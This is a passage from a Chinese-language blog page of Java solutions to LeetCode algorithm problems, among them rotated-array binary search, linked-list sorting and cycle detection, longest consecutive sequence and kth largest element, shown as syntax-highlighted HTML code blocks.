nums[x];</span><br><span class="line">        nums[x] = nums[y];</span><br><span class="line">        nums[y] = temp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="二分法-搜索旋转排序数组"><a href="#二分法-搜索旋转排序数组" class="headerlink" title="二分法_搜索旋转排序数组"></a>二分法_搜索旋转排序数组</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">search</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> target)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = nums.length;</span><br><span class="line">        <span class="keyword">if</span> (n == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (n == <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> nums[<span class="number">0</span>] == target ? <span class="number">0</span> : -<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> l = <span class="number">0</span>, r = n - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (l &lt;= r) &#123;</span><br><span class="line">            <span class="keyword">int</span> mid = (l + r) / <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span> (nums[mid] == target) &#123;</span><br><span class="line">                <span class="keyword">return</span> mid;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (nums[<span class="number">0</span>] &lt;= nums[mid]) &#123;</span><br><span class="line">                <span class="keyword">if</span> (nums[<span class="number">0</span>] &lt;= target &amp;&amp; target &lt; nums[mid]) &#123;</span><br><span class="line">                    r = mid - <span class="number">1</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    l = mid + <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (nums[mid] &lt; target &amp;&amp; target &lt;= nums[n - <span class="number">1</span>]) &#123;</span><br><span class="line">                    l = mid + <span class="number">1</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    r = mid - <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="排序链表"><a href="#排序链表" class="headerlink" title="排序链表"></a>排序链表</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> ListNode <span class="title">sortList</span><span class="params">(ListNode head)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> sortList(head, <span class="keyword">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> ListNode <span class="title">sortList</span><span class="params">(ListNode head, ListNode tail)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (head == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> head;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (head.next == tail) &#123;</span><br><span class="line">            head.next = <span class="keyword">null</span>;</span><br><span class="line">            <span class="keyword">return</span> head;</span><br><span class="line">        &#125;</span><br><span class="line">        ListNode slow = head, fast = head;</span><br><span class="line">        <span class="keyword">while</span> (fast != tail) &#123;</span><br><span class="line">            slow = slow.next;</span><br><span class="line">            fast = fast.next;</span><br><span class="line">            <span class="keyword">if</span> (fast != tail) &#123;</span><br><span class="line">                fast = fast.next;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        ListNode mid = slow;</span><br><span class="line">        ListNode list1 = sortList(head, mid);</span><br><span class="line">        ListNode list2 = sortList(mid, tail);</span><br><span class="line">        ListNode sorted = merge(list1, list2);</span><br><span class="line">        <span class="keyword">return</span> sorted;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> ListNode <span class="title">merge</span><span class="params">(ListNode head1, ListNode head2)</span> </span>&#123;</span><br><span class="line">        ListNode dummyHead = <span class="keyword">new</span> ListNode(<span class="number">0</span>);</span><br><span class="line">        ListNode temp = dummyHead, temp1 = head1, temp2 = head2;</span><br><span class="line">        <span class="keyword">while</span> (temp1 != <span class="keyword">null</span> &amp;&amp; temp2 != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (temp1.val &lt;= temp2.val) &#123;</span><br><span class="line">                temp.next = temp1;</span><br><span class="line">                temp1 = temp1.next;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                temp.next = temp2;</span><br><span class="line">                temp2 = temp2.next;</span><br><span class="line">            &#125;</span><br><span class="line">            temp = temp.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (temp1 != <span class="keyword">null</span>) &#123;</span><br><span class="line">            temp.next = temp1;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (temp2 != <span class="keyword">null</span>) &#123;</span><br><span class="line">            temp.next = temp2;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dummyHead.next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="445-两数相加-II"><a href="#445-两数相加-II" class="headerlink" title="445. 两数相加 II"></a><a href="https://leetcode-cn.com/problems/add-two-numbers-ii/" target="_blank" rel="noopener">445. 两数相加 II</a></h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> ListNode <span class="title">addTwoNumbers</span><span class="params">(ListNode l1, ListNode l2)</span> </span>&#123;</span><br><span class="line">        Deque&lt;Integer&gt; stack1 = <span class="keyword">new</span> LinkedList&lt;Integer&gt;();</span><br><span class="line">        Deque&lt;Integer&gt; stack2 = <span class="keyword">new</span> LinkedList&lt;Integer&gt;();</span><br><span class="line">        <span class="keyword">while</span> (l1 != <span class="keyword">null</span>) &#123;</span><br><span class="line">            stack1.push(l1.val);</span><br><span class="line">            l1 = l1.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (l2 != <span class="keyword">null</span>) &#123;</span><br><span class="line">            stack2.push(l2.val);</span><br><span class="line">            l2 = l2.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> carry = <span class="number">0</span>;</span><br><span class="line">        ListNode ans = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">while</span> (!stack1.isEmpty() || !stack2.isEmpty() || carry != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">int</span> a = stack1.isEmpty() ? <span class="number">0</span> : stack1.pop();</span><br><span class="line">            <span class="keyword">int</span> b = stack2.isEmpty() ? <span class="number">0</span> : stack2.pop();</span><br><span class="line">            <span class="keyword">int</span> cur = a + b + carry;</span><br><span class="line">            carry = cur / <span class="number">10</span>;</span><br><span class="line">            cur %= <span class="number">10</span>;</span><br><span class="line">            ListNode curnode = <span class="keyword">new</span> ListNode(cur);</span><br><span class="line">            curnode.next = ans;</span><br><span class="line">            ans = curnode;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="环形链表（要返回入环的第一个节点）空间要用-O-1"><a href="#环形链表（要返回入环的第一个节点）空间要用-O-1" class="headerlink" title="环形链表（要返回入环的第一个节点）空间要用 O(1)"></a>环形链表（要返回入环的第一个节点）空间要用 O(1)</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//哈希函数 O(n)  O(n)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> ListNode <span class="title">detectCycle</span><span class="params">(ListNode head)</span> </span>&#123;</span><br><span class="line">        ListNode pos = head;</span><br><span class="line">        Set&lt;ListNode&gt; visited = <span class="keyword">new</span> HashSet&lt;ListNode&gt;();</span><br><span class="line">        <span class="keyword">while</span> (pos != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (visited.contains(pos)) &#123;</span><br><span class="line">                <span class="keyword">return</span> pos;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                visited.add(pos);</span><br><span class="line">            &#125;</span><br><span class="line">            pos = pos.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//快慢指针 O(n)  O(1)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> ListNode <span class="title">detectCycle</span><span class="params">(ListNode head)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (head == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        ListNode slow = head, fast = head;</span><br><span class="line">        <span class="keyword">while</span> (fast != <span class="keyword">null</span>) &#123;</span><br><span class="line">            slow = slow.next;</span><br><span class="line">            <span class="keyword">if</span> (fast.next != <span class="keyword">null</span>) &#123;</span><br><span class="line">                fast = fast.next.next;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (fast == slow) &#123;</span><br><span class="line">                ListNode ptr = head;</span><br><span class="line">                <span class="keyword">while</span> (ptr != slow) &#123;</span><br><span class="line">                    ptr = ptr.next;</span><br><span class="line">                    slow = slow.next;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> ptr;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="寻找旋转排序数组中的最小值"><a href="#寻找旋转排序数组中的最小值" class="headerlink" title="寻找旋转排序数组中的最小值"></a><a href="https://leetcode-cn.com/problems/find-minimum-in-rotated-sorted-array/" target="_blank" rel="noopener">寻找旋转排序数组中的最小值</a></h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">findMin</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> low = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> high = nums.length - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (low &lt; high) &#123;</span><br><span class="line">            <span class="keyword">int</span> pivot = low + (high - low) / <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span> (nums[pivot] &lt; nums[high]) &#123;</span><br><span class="line">                high = pivot;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                low = pivot + <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> nums[low];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="搜索旋转排序数组-II"><a href="#搜索旋转排序数组-II" class="headerlink" title="搜索旋转排序数组 II"></a>搜索旋转排序数组 II</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">search</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> target)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = nums.length;</span><br><span class="line">        <span class="keyword">if</span> (n == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (n == <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> nums[<span class="number">0</span>] == target;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> l = <span class="number">0</span>, r = n - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (l &lt;= r) &#123;</span><br><span class="line">            <span class="keyword">int</span> mid = (l + r) / <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span> (nums[mid] == target) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (nums[l] == nums[mid] &amp;&amp; nums[mid] == nums[r]) &#123;</span><br><span class="line">                ++l;</span><br><span class="line">                --r;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (nums[l] &lt;= nums[mid]) &#123;</span><br><span class="line">                <span class="keyword">if</span> (nums[l] &lt;= target &amp;&amp; target &lt; nums[mid]) &#123;</span><br><span class="line">                    r = mid - <span class="number">1</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    l = mid + <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (nums[mid] &lt; target &amp;&amp; target &lt;= nums[r]) &#123;</span><br><span class="line">                    l = mid + <span class="number">1</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    r = mid - <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="最长连续序列"><a href="#最长连续序列" class="headerlink" title="最长连续序列"></a>最长连续序列</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">longestConsecutive</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        Set&lt;Integer&gt; num_set = <span class="keyword">new</span> HashSet&lt;Integer&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> num : nums) &#123;</span><br><span class="line">            num_set.add(num);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> longestStreak = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> num : num_set) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!num_set.contains(num - <span class="number">1</span>)) &#123;</span><br><span class="line">                <span class="keyword">int</span> currentNum = num;</span><br><span class="line">                <span class="keyword">int</span> currentStreak = <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">while</span> (num_set.contains(currentNum + <span class="number">1</span>)) &#123;</span><br><span class="line">                    currentNum += <span class="number">1</span>;</span><br><span class="line">                    currentStreak += <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                longestStreak = Math.max(longestStreak, currentStreak);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> longestStreak;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="最长连续上升子序列"><a href="#最长连续上升子序列" class="headerlink" title="最长连续上升子序列"></a>最长连续上升子序列</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//很省空间的做法 时间O(n^2)</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">lengthOfLIS</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(nums == <span class="keyword">null</span> || nums.length == <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> maxLen = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span> [] dp = <span class="keyword">new</span> <span class="keyword">int</span>[nums.length];</span><br><span class="line">        Arrays.fill(dp, <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">1</span>; j &lt; nums.length; j++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; j; i++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(nums[j] &gt; nums[i])&#123;</span><br><span class="line">                    dp[j] = Math.max(dp[i] + <span class="number">1</span>, dp[j]);</span><br><span class="line">                    maxLen = Math.max(maxLen, dp[j]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> maxLen;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="在排序数组中查找元素的第一个和最后一个位置"><a href="#在排序数组中查找元素的第一个和最后一个位置" class="headerlink" title="在排序数组中查找元素的第一个和最后一个位置"></a><a href="https://leetcode-cn.com/problems/find-first-and-last-position-of-element-in-sorted-array/" target="_blank" rel="noopener">在排序数组中查找元素的第一个和最后一个位置</a></h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span>[] searchRange(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> target) &#123;</span><br><span class="line">        <span class="keyword">int</span> leftIdx = binarySearch(nums, target, <span class="keyword">true</span>);</span><br><span class="line">        <span class="keyword">int</span> rightIdx = binarySearch(nums, target, <span class="keyword">false</span>) - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (leftIdx &lt;= rightIdx &amp;&amp; rightIdx &lt; nums.length &amp;&amp; nums[leftIdx] == target &amp;&amp; nums[rightIdx] == target) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="keyword">int</span>[]&#123;leftIdx, rightIdx&#125;;</span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="keyword">int</span>[]&#123;-<span class="number">1</span>, -<span class="number">1</span>&#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">binarySearch</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> target, <span class="keyword">boolean</span> lower)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> left = <span class="number">0</span>, right = nums.length - <span class="number">1</span>, ans = nums.length;</span><br><span class="line">        <span class="keyword">while</span> (left &lt;= right) &#123;</span><br><span class="line">            <span class="keyword">int</span> mid = (left + right) / <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span> (target &lt; nums[mid] || (lower &amp;&amp; target &lt;= nums[mid])) &#123;</span><br><span class="line">                right = mid - <span class="number">1</span>;</span><br><span class="line">                ans = mid;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                left = mid + <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="数组中的第K个最大元素"><a href="#数组中的第K个最大元素" class="headerlink" title=" 数组中的第K个最大元素"></a><a href="https://leetcode-cn.com/problems/kth-largest-element-in-an-array/" target="_blank" rel="noopener"> 数组中的第K个最大元素</a></h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//小顶堆</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">findKthLargest</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">        PriorityQueue&lt;Integer&gt; pq = <span class="keyword">new</span> PriorityQueue&lt;&gt;(k);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; k; i++) &#123;</span><br><span class="line">            pq.add(nums[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = k; i &lt; nums.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (nums[i] &gt; pq.peek()) &#123;</span><br><span class="line">                pq.remove();</span><br><span class="line">                pq.add(nums[i]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> pq.peek();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="丑数"><a href="#丑数" class="headerlink" title="丑数"></a>丑数</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">nthUglyNumber</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[] factors = &#123;<span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>&#125;;</span><br><span class="line">        Set&lt;Long&gt; seen = <span class="keyword">new</span> HashSet&lt;Long&gt;();</span><br><span class="line">        PriorityQueue&lt;Long&gt; heap = <span class="keyword">new</span> PriorityQueue&lt;Long&gt;();</span><br><span class="line">        seen.add(<span class="number">1L</span>);</span><br><span class="line">        heap.offer(<span class="number">1L</span>);</span><br><span class="line">        <span class="keyword">int</span> ugly = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) 